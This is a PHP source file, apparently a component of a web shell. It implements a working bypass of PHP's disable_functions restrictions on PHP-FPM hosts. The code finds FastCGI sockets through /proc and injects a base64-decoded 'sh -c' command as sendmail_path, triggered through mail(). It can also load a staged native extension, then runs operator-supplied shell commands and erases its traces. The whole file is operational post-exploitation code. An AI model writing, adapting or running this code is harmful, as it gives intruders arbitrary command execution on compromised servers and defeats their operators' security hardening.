<?php
// ==================== FASTCGI TAKEOVER (disable_functions bypass) ==========
// Gives the OS Shell an execution path on hosts where every exec function is
// disabled but the request is served by PHP-FPM (or any FastCGI PHP) whose
// endpoint this uid can reach: per-request ini injected via PHP_VALUE /
// PHP_ADMIN_VALUE FastCGI params.
//
// Techniques (validated against a default-posture aaPanel lab):
//   t1  PHP_VALUE sendmail_path="sh -c 'echo <b64> | base64 -d | sh > OUT'"
//       + a mail()/error_log(,1) trigger call — both route through
//       php_mail() -> popen(sendmail_path), untouched by disable_functions.
//   t2  PHP_ADMIN_VALUE extension_dir + extension=<staged .so> + armed flag
//       — FPM dlopen()s the module into the live worker; poc_exec() is
//       native C. Needs an ABI-matched module implementing poc_exec with
//       the poc_ext.armed gate (see research poc_ext.c).
//
// Endpoint discovery is ZERO-NOISE: unix sockets (/proc/net/unix) and
// loopback TCP listeners (/proc/net/tcp{,6}) are fingerprinted by OWNER
// before any connection — the socket inode is mapped to a process via
// /proc/<pid>/fd and only sockets held by php-fpm/php-cgi processes are
// contacted (then confirmed via the spec-native FCGI_GET_VALUES record).
// No bytes are ever sent to mysqld/docker/systemd & co. If the owner scan
// is unavailable (restricted /proc), discovery falls back to conventional
// FastCGI locations probed with the harmless GET_VALUES management record
// only — application-level payloads are never sent to unidentified
// services.
//
// Every mode is a full self-cleaning cycle on one FCGI_KEEP_CONN-pinned
// worker: pre-heal -> clean probe (capture true ini defaults) -> exploit ->
// cleanup (restore sendmail_path / disable_functions / extension_dir,
// disarm module, unlink temp artifacts). The cleanup response itself
// verifies the restore; no state is kept between commands.

// ---- inner branch: raw FastCGI requests execute THIS file with custom
// params (POC_ROLE/POC_MODE/POC_CMD) that no webserver forwards, so this
// code is unreachable over plain HTTP ----
if (!empty($_SERVER['POC_ROLE']) && $_SERVER['POC_ROLE'] === 'inner') {
    $mode = isset($_SERVER['POC_MODE']) ? $_SERVER['POC_MODE'] : '';
    if ($mode === 'probe') {
        echo 'inner[probe]: php=' . PHP_VERSION
           . ' zts=' . (ZEND_THREAD_SAFE ? 1 : 0)
           . ' sapi=' . php_sapi_name() . "\n";
        // process uid when posix is loaded; getmyuid() is the file OWNER,
        // which misleads when the shell file is root-owned
        echo 'inner[probe]: uid=' . (function_exists('posix_getuid') ? posix_getuid() : getmyuid()) . ' file-owner=' . get_current_user() . "\n";
        echo 'inner[probe]: disable_functions=' . ini_get('disable_functions') . "\n";
        echo 'inner[probe]: sendmail_path=[' . ini_get('sendmail_path') . "]\n";
        echo 'inner[probe]: extension_dir=' . ini_get('extension_dir') . "\n";
        echo 'inner[probe]: poc_ext=' . (function_exists('poc_exec') ? 1 : 0) . "\n";
        echo 'inner[probe]: mail=' . (function_exists('mail') ? 1 : 0)
           . ' error_log=' . (function_exists('error_log') ? 1 : 0) . "\n";
    } elseif ($mode === 'trigger') {
        // dummy recipient/subject — the call exists only to make PHP
        // popen() the injected sendmail_path; nothing is emailed
        if (function_exists('mail')) {
            echo 'inner[trigger]: mail() returned ' . var_export(@mail('x@localhost', 'x', 'x'), true) . "\n";
        } else {
            echo 'inner[trigger]: error_log returned ' . var_export(@error_log('x', 1, 'x@localhost'), true) . "\n";
        }
    } elseif ($mode === 'ext') {
        $cmd = isset($_SERVER['POC_CMD']) ? base64_decode($_SERVER['POC_CMD']) : 'id';
        if (!function_exists('poc_exec')) {
            echo 'inner[ext]: poc_exec NOT available (extension did not load - ABI mismatch?)';
        } elseif (ini_get('poc_ext.armed') != '1') {
            echo 'inner[ext]: module loaded but NOT armed - refusing';
        } else {
            poc_exec($cmd);   // streams to FastCGI stdout
        }
    } elseif ($mode === 'cleanup') {
        $df = ini_get('disable_functions');
        echo 'inner[cleanup]: sendmail_path = [' . ini_get('sendmail_path') . "]\n";
        echo 'inner[cleanup]: disable_functions = ' . ($df === '' ? '(empty!)' : substr($df, 0, 40) . '...(' . count(explode(',', $df)) . " fns)\n");
        echo 'inner[cleanup]: poc_ext.armed = '
           . (ini_get('poc_ext.armed') === false ? '(module not loaded)' : var_export(ini_get('poc_ext.armed'), true)) . "\n";
    }
    exit;
}

// ---- FastCGI wire helpers (names prefixed bp_ to stay collision-free) ----

function bp_pack($type, $id, $content) {
    $len = strlen($content);
    $pad = (8 - ($len % 8)) % 8;
    return "\x01" . chr($type) . chr($id >> 8) . chr($id & 0xFF)
         . chr($len >> 8) . chr($len & 0xFF) . chr($pad) . "\x00"
         . $content . str_repeat("\x00", $pad);
}

function bp_nvp($name, $value) {
    $h = ''; $n = strlen($name); $v = strlen($value);
    $h .= $n < 128 ? chr($n) : pack('N', $n | 0x80000000);
    $h .= $v < 128 ? chr($v) : pack('N', $v | 0x80000000);
    return $h . $name . $value;
}

// Reads one complete FastCGI record; false on timeout/close.
function bp_read_record($s, &$type, &$body) {
    $hdr = '';
    while (strlen($hdr) < 8) {
        $c = fread($s, 8 - strlen($hdr));
        if ($c === false || $c === '') return false;
        $hdr .= $c;
    }
    $type = ord($hdr[1]);
    $len  = (ord($hdr[4]) << 8) | ord($hdr[5]);
    $pad  = ord($hdr[6]);
    $need = $len + $pad;
    $body = '';
    while (strlen($body) < $need) {
        $c = fread($s, $need - strlen($body));
        if ($c === false || $c === '') return false;
        $body .= $c;
    }
    if ($pad) $body = substr($body, 0, $len);
    return true;
}

function bp_open($endpoint, $to = 10) {
    $errno = 0; $errstr = '';
    $s = @fsockopen($endpoint, -1, $errno, $errstr, $to);
    if ($s) stream_set_timeout($s, 20);
    return $s;
}

// One responder request on a kept connection (FCGI_KEEP_CONN pins the worker).
function bp_talk($s, $params) {
    $out = bp_pack(1, 1, pack('nCx5', 1, 1));
    $body = '';
    foreach ($params as $k => $v) $body .= bp_nvp($k, $v);
    $out .= bp_pack(4, 1, $body) . bp_pack(4, 1, '');
    $out .= bp_pack(5, 1, '') . bp_pack(5, 1, '');
    if (fwrite($s, $out) === false) return '';
    $parsed = '';
    while (bp_read_record($s, $type, $body)) {   // stop at END_REQUEST — with
        if ($type === 6 || $type === 7) $parsed .= $body;   // KEEP_CONN the
        if ($type === 3) break;                   // worker never closes
    }
    return $parsed;
}

// Spec-native FastCGI identification: FCGI_GET_VALUES (type 9, requestId 0)
// — only a FastCGI application answers (type 10). Harmless management
// record, safe to send to any socket. Returns the reported values or null.
function bp_get_values($s) {
    $body = bp_nvp('FCGI_MAX_CONNS', '') . bp_nvp('FCGI_MAX_REQS', '')
          . bp_nvp('FCGI_MPXS_CONNS', '');   // FPM echoes the names it reports
    if (fwrite($s, bp_pack(9, 0, $body)) === false) return null;
    stream_set_timeout($s, 2);
    $vals = null;
    while (bp_read_record($s, $type, $rbody)) {
        if ($type === 10) { $vals = []; $off = 0; $l = strlen($rbody);
            while ($off + 1 < $l) {
                $n = ord($rbody[$off]); $nl = $n < 128 ? 1 : 4;
                if ($nl === 4 && $off + 4 > $l) break;
                $n = $nl === 1 ? $n : (unpack('N', substr($rbody, $off, 4))[1] & 0x7fffffff);
                $off += $nl;
                if ($off + 1 > $l) break;
                $v = ord($rbody[$off]); $vl = $v < 128 ? 1 : 4;
                if ($vl === 4 && $off + 4 > $l) break;
                $v = $vl === 1 ? $v : (unpack('N', substr($rbody, $off, 4))[1] & 0x7fffffff);
                $off += $vl;
                if ($off + $n + $v > $l) break;
                $vals[substr($rbody, $off, $n)] = substr($rbody, $off + $n, $v);
                $off += $n + $v;
            }
            break;
        }
        if ($type === 3) break;
    }
    return $vals;
}

function bp_inner_params($mode, $ini = [], $admin = false, $cmdB64 = '') {
    // DOCUMENT_ROOT from the outer web request when available (a real root
    // for however the shell is deployed); else the shell's own directory —
    // never a path ABOVE the deployment. Only SCRIPT_NAME derives from it.
    $docRoot = !empty($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
    $script = str_replace($docRoot, '', __FILE__);
    $p = [
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'SERVER_SOFTWARE'   => 'shells-x',
        'REQUEST_METHOD'    => 'GET',
        'SCRIPT_FILENAME'   => __FILE__,       // inner request executes THIS file
        'SCRIPT_NAME'       => $script,
        'DOCUMENT_ROOT'     => $docRoot,
        'DOCUMENT_URI'      => $script,
        'REQUEST_URI'       => $script,
        'QUERY_STRING'      => '',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REDIRECT_STATUS'   => '200',
        'POC_ROLE'          => 'inner',        // never forwarded by webservers
        'POC_MODE'          => $mode,
    ];
    if ($cmdB64 !== '') $p['POC_CMD'] = $cmdB64;
    // bearer token for the auth gate: the build's own hash, same file
    $p['POC_TOKEN'] = isset($GLOBALS['__AUTH_HASH']) ? $GLOBALS['__AUTH_HASH'] : '';
    if ($ini) {
        $key = $admin ? 'PHP_ADMIN_VALUE' : 'PHP_VALUE';
        $p[$key] = implode("\n", $ini);
    }
    return $p;
}

// Full worker restore. PHP_ADMIN_VALUE part is unconditional: unknown
// poc_ext.armed just logs a harmless notice when the module isn't loaded,
// and this is what disarms a module loaded by an older run.
function bp_cleanup($s, $sm, $df, $extdir) {
    $p = bp_inner_params('cleanup',
        ['sendmail_path = "' . $sm . '"', 'disable_functions = ' . $df], false);
    $p['PHP_ADMIN_VALUE'] = implode("\n",
        ['extension_dir = ' . $extdir, 'poc_ext.armed = 0']);
    return bp_talk($s, $p);
}

function bp_probe_line($resp, $key) {
    if (preg_match('/inner\[probe\]: ' . preg_quote($key, '/') . '=(.*)/', $resp, $m))
        return rtrim($m[1], "\n");
    return null;
}

// ---- zero-noise endpoint discovery: owner fingerprinting via /proc ----

// Map listening-socket inode -> owning process identity. /proc/<pid>/fd is
// readable only for same-uid processes (or root) — conveniently, the FPM
// pool workers run as OUR uid, so exactly the sockets we can actually
// connect to are also the ones we can fingerprint. Returns
// inode => "comm\0cmdline" (truncated) for readable processes.
function bp_socket_owners() {
    $owners = [];
    foreach (@glob('/proc/[0-9]*', GLOB_ONLYDIR) ?: [] as $pd) {
        $pid = basename($pd);
        $comm = @file_get_contents("$pd/comm");
        if ($comm === false || $comm === '') continue;
        $comm = rtrim($comm);
        $cmdline = (string)@file_get_contents("$pd/cmdline");
        foreach (@scandir("$pd/fd") ?: [] as $fd) {
            if ($fd === '.' || $fd === '..') continue;
            $link = @readlink("$pd/fd/$fd");
            if ($link !== false && preg_match('/^socket:\[(\d+)\]$/', $link, $m))
                $owners[$m[1]] = $comm . "\x00" . substr($cmdline, 0, 256);
        }
    }
    return $owners;
}

// Does this owner identity look like a FastCGI PHP server?
function bp_owner_is_fcgi($owner) {
    list($comm, $cmdline) = explode("\x00", $owner . "\x00");
    $hay = strtolower($comm . ' ' . str_replace("\x00", ' ', $cmdline));
    return (strpos($hay, 'php-fpm') !== false || strpos($hay, 'php-cgi') !== false);
}

function bp_unix_paths() {
    $lines = @file('/proc/net/unix', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return [];
    array_shift($lines);
    $out = [];
    foreach ($lines as $l) {
        // columns: Num RefCount Protocol Flags Type St Inode Path — inode is
        // field 7 (index 6), path may be absent (unnamed) or '@'-prefixed
        $c = preg_split('/\s+/', trim($l));
        if (count($c) < 7) continue;
        $inode = $c[6];
        $path = implode(' ', array_slice($c, 7));
        if ($path === '' || $path[0] === '@') continue;
        $out[] = ['inode' => $inode, 'path' => $path];
    }
    return $out;
}

// Loopback LISTEN entries from /proc/net/tcp and /proc/net/tcp6 with their
// inodes. /proc stores IPv4 little-endian ("0100007F"); ipv6 words are also
// little-endian per u32 but ::1/ANY checks are byte-order agnostic.
function bp_tcp_listen() {
    $out = [];
    foreach (['/proc/net/tcp', '/proc/net/tcp6'] as $f) {
        $lines = @file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (!$lines) continue;
        array_shift($lines);
        foreach ($lines as $l) {
            $c = preg_split('/\s+/', trim($l));
            if (count($c) < 10 || $c[3] !== '0A') continue;   // LISTEN only
            list($iphex, $porthex) = explode(':', $c[1]);
            $port = hexdec($porthex);
            if ($port === 0) continue;
            $lo = false;
            if (strlen($iphex) === 8) {
                $lo = (long2ip(unpack('N', strrev(pack('H*', $iphex)))[1]) === '127.0.0.1');
            } else {
                $v6 = strtolower($iphex);
                $lo = ($v6 === str_repeat('0', 32)
                    || $v6 === '00000000000000000000000100000001');   // ::1
            }
            if ($lo) $out[] = ['inode' => $c[9], 'port' => $port];
        }
    }
    return $out;
}

// Identify one endpoint as FastCGI via GET_VALUES (management record only —
// harmless to any service). Returns [method, info] or null.
function bp_identify($ep, $to = 2) {
    $s = bp_open($ep, $to);
    if (!$s) return null;
    stream_set_timeout($s, $to);
    $gv = bp_get_values($s);
    fclose($s);
    if (is_array($gv)) {
        $info = [];
        foreach ($gv as $k => $v) if ($v !== '') $info[] = "$k=$v";
        return ['method' => 'fcgi-get_values', 'info' => implode(' ', $info)];
    }
    return null;
}

// Discovery, zero-noise by construction:
//  1. Owner fingerprinting — map socket inodes to owning processes via
//     /proc/<pid>/fd and contact only php-fpm/php-cgi-owned sockets. Works
//     where those /proc entries are readable (bare metal, many VPS).
//     LIMITATION: php-fpm pool workers are non-dumpable after setuid, so
//     on hardened/container hosts their /proc entries are root-owned and
//     the scan sees nothing — hence the fallback.
//  2. Fallback — conventional FastCGI socket locations (path-constrained,
//     never /var/run/mysqld or similar) plus loopback LISTEN ports from the
//     kernel table, each probed with FCGI_GET_VALUES ONLY: a ~60-byte,
//     well-formed FastCGI MANAGEMENT record. Non-FastCGI services discard
//     it as a parse error; no application payload is ever sent to an
//     unidentified service (app-level probes happen exclusively in `probe`
//     mode against the endpoint the operator selected).
function bp_discover() {
    $found = [];
    $owners = bp_socket_owners();
    if (!empty($owners)) {
        foreach (bp_unix_paths() as $u) {
            if (!isset($owners[$u['inode']]) || !bp_owner_is_fcgi($owners[$u['inode']])) continue;
            $id = bp_identify('unix://' . $u['path']);
            if ($id) $found[] = ['ep' => 'unix://' . $u['path'], 'method' => 'owner+get_values', 'info' => $id['info']];
        }
        foreach (bp_tcp_listen() as $t) {
            if (!isset($owners[$t['inode']]) || !bp_owner_is_fcgi($owners[$t['inode']])) continue;
            $id = bp_identify('tcp://127.0.0.1:' . $t['port']);
            if ($id) $found[] = ['ep' => 'tcp://127.0.0.1:' . $t['port'], 'method' => 'owner+get_values', 'info' => $id['info']];
        }
        if ($found) return $found;
        // owners were readable but no fpm socket matched (container case:
        // non-dumpable pool workers) — fall through to the path/table scan
    }
    $cands = [];
    foreach (['/tmp/php-cgi-*.sock', '/run/php/*.sock', '/var/run/php/*.sock',
              '/run/php-fpm/*.sock', '/var/run/php-fpm/*.sock'] as $g)
        foreach ((glob($g) ?: []) as $p) $cands['unix://' . $p] = true;
    // loopback listeners straight from the kernel table (no port guessing)
    foreach (bp_tcp_listen() as $t) $cands['tcp://127.0.0.1:' . $t['port']] = true;
    foreach (array_keys($cands) as $ep) {
        $id = bp_identify($ep, 1);   // 1s probe budget per candidate
        if ($id) $found[] = ['ep' => $ep, 'method' => 'get_values', 'info' => $id['info']];
    }
    return $found;
}

// ---- one full pre-heal + capture cycle; returns defaults or null ----

function bp_capture_defaults($s) {
    // pre-heal with this context's ini (best guess reference) heals poison
    // leaked by older runs, then the clean probe reports true defaults
    bp_cleanup($s, ini_get('sendmail_path'), ini_get('disable_functions'), ini_get('extension_dir'));
    $p0 = bp_talk($s, bp_inner_params('probe'));
    if (strpos($p0, 'inner[probe]:') === false) return null;
    $sm = bp_probe_line($p0, 'sendmail_path');
    $df = (string)bp_probe_line($p0, 'disable_functions');
    $ed = (string)bp_probe_line($p0, 'extension_dir');
    return [
        'sm'  => $sm !== null ? trim($sm, '[]') : ini_get('sendmail_path'),
        'df'  => $df !== '' ? $df : ini_get('disable_functions'),
        'ed'  => $ed !== '' ? $ed : ini_get('extension_dir'),
        'ext' => bp_probe_line($p0, 'poc_ext') === '1',   // module already on this worker
        'raw' => $p0,
    ];
}

// ---- outer action handler ----

if (isset($_POST['action']) && $_POST['action'] === 'bypass') {
    if (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    $mode = $_POST['mode'] ?? '';

    if ($mode === 'discover') {
        echo json_encode(['ok' => true, 'endpoints' => bp_discover()]);
        exit;
    }

    if ($mode === 'probe') {
        $ep = $_POST['ep'] ?? '';
        $s = bp_open($ep, 10);
        if (!$s) { echo json_encode(['ok' => false, 'error' => "connect failed: $ep"]); exit; }
        $def = bp_capture_defaults($s);
        if ($def === null) { fclose($s); echo json_encode(['ok' => false, 'error' => 'probe request failed (not FastCGI PHP?)']); exit; }
        // marker injection test
        $MARK = 'FASTCGI-INI-INJECTION-PROBE';
        $p1 = bp_talk($s, bp_inner_params('probe', ['sendmail_path = ' . $MARK]));
        $inj = (bp_probe_line($p1, 'sendmail_path') === '[' . $MARK . ']');
        $cl = bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
        fclose($s);
        preg_match('/mail=(\d)/', $def['raw'], $m1);
        preg_match('/error_log=(\d)/', $def['raw'], $m2);
        preg_match('/php=(\S+)/', $def['raw'], $m3);
        preg_match('/zts=(\d)/', $def['raw'], $m4);
        preg_match('/uid=(\S+)/', $def['raw'], $m5);
        echo json_encode([
            'ok' => true,
            'injection' => $inj,
            'mail' => ($m1[1] ?? '0') === '1',
            'error_log' => ($m2[1] ?? '0') === '1',
            'php' => $m3[1] ?? PHP_VERSION,
            'zts' => ($m4[1] ?? '0') === '1',
            'uid' => $m5[1] ?? '',
            'defaults' => ['sm' => $def['sm'], 'df_len' => $def['df'] === '' ? 0 : count(explode(',', $def['df'])), 'ed' => $def['ed']],
            'cleanup_verified' => strpos($cl, 'inner[cleanup]:') !== false,
        ]);
        exit;
    }

    if ($mode === 'run') {
        $tech = $_POST['tech'] ?? 't1';
        if (!in_array($tech, ['t1', 't2'], true)) {
            echo json_encode(['available' => false, 'error' => "unknown technique: $tech"]);
            exit;
        }
        $ep      = $_POST['ep'] ?? '';
        $cmd     = $_POST['cmd'] ?? '';
        $cwd     = $_POST['cwd'] ?? getcwd();
        $so      = $_POST['so'] ?? '';      // t2: path to ABI-matched module on target
        $timeout = (int) ($_POST['timeout'] ?? 30);
        if ($timeout <= 0) $timeout = 30;
        if (!is_dir($cwd)) $cwd = getcwd();
        // honor the operator's timeout: both this PHP request and every
        // socket read on the pinned connection outlive the command itself
        set_time_limit($timeout + 15);
        // hex nonce marker — collision-safe against command output
        $marker = '__CWDB_' . bin2hex(random_bytes(4));
        // base64 transport: no quoting hell between ini value / sh -c / popen.
        // The cd target is base64-encoded too — no escapeshellarg dependency
        // (it is disabled on some hardened hosts).
        $wrapped = 'cd "$(echo ' . base64_encode($cwd) . ' | base64 -d)" && (' . $cmd . ') 2>&1; echo "' . $marker . ':$(pwd)"';
        $b64 = base64_encode($wrapped);
        $maxOutput = 5 * 1024 * 1024;
        $s = bp_open($ep, 10);
        if (!$s) { echo json_encode(['available' => false, 'error' => "connect failed: $ep"]); exit; }
        stream_set_timeout($s, $timeout + 10);   // long commands outlive the default 20s
        $def = bp_capture_defaults($s);
        if ($def === null) { fclose($s); echo json_encode(['available' => false, 'error' => 'probe failed']); exit; }
        $output = '';
        $method = '';

        if ($tech === 't1') {
            // random path, NOT pre-created: the injected sh creates it under
            // the pool user's ownership, so shell-uid != pool-uid can't break it
            $OUT = sys_get_temp_dir() . '/sx_' . bin2hex(random_bytes(6));
            $inject = bp_talk($s, bp_inner_params('trigger',
                ['sendmail_path = "sh -c \'echo ' . $b64 . ' | base64 -d | sh > ' . $OUT . ' 2>&1\'"']));
            // php_mail()'s pclose() blocks until the command finishes, so by
            // the time the trigger responds the output file is complete; the
            // small sleep only covers scheduling jitter
            usleep(200000);
            clearstatcache();
            if (file_exists($OUT)) { $output = (string)file_get_contents($OUT); @unlink($OUT); }
            if ($output === '' && strpos($inject, 'returned true') === false) {
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => 'trigger produced no output']);
                exit;
            }
            $method = 'fcgi-sendmail';
        } else {   // t2 — extension loading
            if ($so === '' || !file_exists($so)) {
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => 't2 needs so=<path to ABI-matched poc_ext .so on target>']);
                exit;
            }
            // module persists on the pinned worker between commands — stage a
            // copy ONLY when a load is actually needed (not already loaded);
            // re-arming an already-loaded module needs no file at all
            $extIni = null;
            $SO_TMP = null;
            if ($def['ext']) {
                $extIni = ['poc_ext.armed = 1'];
            } else {
                $SO_TMP = sys_get_temp_dir() . '/sx_ext_' . bin2hex(random_bytes(6)) . '.so';
                if (!copy($so, $SO_TMP)) {
                    bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                    fclose($s);
                    echo json_encode(['available' => false, 'error' => "could not stage $so"]);
                    exit;
                }
                $extIni = ['extension_dir = ' . dirname($SO_TMP), 'extension = ' . basename($SO_TMP), 'poc_ext.armed = 1'];
            }
            $output = bp_talk($s, bp_inner_params('ext', $extIni, true, $b64));
            // strip stderr PHP-message residue and the FastCGI response
            // header block (Content-type, cache headers) — header lines are
            // Capitalized-Word: value, body lines like uid= are not
            $output = preg_replace('/PHP message: PHP [A-Za-z]+:[^\r\n]*/', '', $output);
            $output = preg_replace('/^(?:[A-Z][A-Za-z0-9-]*:[^\r\n]*\r?\n)+\r?\n/', '', $output);
            // Self-healing retry: FPM's per-worker ini caching can apply a
            // request's directives in an order that loads the module but
            // drops the arming (observed on workers carrying state from
            // older exploit sessions). One retry with the complementary ini
            // set deterministically recovers — after a load attempt the
            // module is present (arm-only suffices); after an arm-only
            // attempt on a probe false-negative, a full load is the cure.
            if (strpos($output, 'NOT armed') !== false) {
                if ($SO_TMP === null) {   // arm-only was tried — stage for the full-load retry
                    $SO_TMP = sys_get_temp_dir() . '/sx_ext_' . bin2hex(random_bytes(6)) . '.so';
                    if (!copy($so, $SO_TMP)) $SO_TMP = null;
                }
                $retryIni = ($def['ext'] && $SO_TMP !== null)
                    ? ['extension_dir = ' . dirname($SO_TMP), 'extension = ' . basename($SO_TMP), 'poc_ext.armed = 1']
                    : ['poc_ext.armed = 1'];
                $output = bp_talk($s, bp_inner_params('ext', $retryIni, true, $b64));
                $output = preg_replace('/PHP message: PHP [A-Za-z]+:[^\r\n]*/', '', $output);
                $output = preg_replace('/^(?:[A-Z][A-Za-z0-9-]*:[^\r\n]*\r?\n)+\r?\n/', '', $output);
            }
            if ($SO_TMP !== null) @unlink($SO_TMP);   // unlinking a mapped .so is safe on Linux
            if (strpos($output, 'NOT available') !== false || strpos($output, 'NOT armed') !== false || trim($output) === '') {
                $err = trim($output) !== '' ? trim($output) : 'extension produced no output';
                bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
                fclose($s);
                echo json_encode(['available' => false, 'error' => $err]);
                exit;
            }
            $method = 'fcgi-ext';
        }

        $cl = bp_cleanup($s, $def['sm'], $def['df'], $def['ed']);
        fclose($s);

        // extract new cwd from output (same technique as shell.php)
        $newCwd = $cwd;
        if (preg_match('/' . preg_quote($marker, '/') . ':(.+)$/m', $output, $m)) {
            $newCwd = trim($m[1]);
            $output = preg_replace('/' . preg_quote($marker, '/') . ':(.+)\n?$/', '', $output);
        }
        $truncated = false;
        if (strlen($output) > $maxOutput) { $output = substr($output, 0, $maxOutput); $truncated = true; }
        $result = [
            'output' => rtrim($output),
            'cwd' => $newCwd,
            'method' => $method,
            'available' => true,
            'cleanup_verified' => strpos($cl, 'inner[cleanup]:') !== false,
        ];
        if ($truncated) $result['truncated'] = true;
        echo json_encode($result);
        exit;
    }

    echo json_encode(['ok' => false, 'error' => 'unknown mode']);
    exit;
}
